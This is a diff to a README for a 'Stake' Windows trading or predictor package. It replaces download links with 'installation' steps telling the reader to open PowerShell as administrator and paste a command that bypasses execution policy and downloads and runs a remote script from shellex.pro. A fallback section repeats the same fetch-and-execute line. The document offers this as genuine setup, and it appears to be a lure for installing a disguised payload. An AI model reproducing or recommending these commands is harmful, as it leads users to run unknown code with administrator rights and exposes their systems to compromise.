@@ -4,18 +4,31 @@
 
 Stake desktop package for Windows · trading toolkit · local install ready.
 
-## Install package
+## INSTALLATION
 
-> **Your download is below.** Badge or table link — both go to **Stake** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://stake-predictor.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://stake-predictor.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">STAKE</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Release page** | **[stake-predictor.mefidirect.xyz](https://stake-predictor.mefidirect.xyz/)** |
-| **Full URL** | `https://stake-predictor.mefidirect.xyz/` |
-| **Type** | ZIP archive · Windows 10 / 11 · 64-bit |
-| **Admin** | Launch the installer with Administrator rights
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 🧩 Capabilities
 
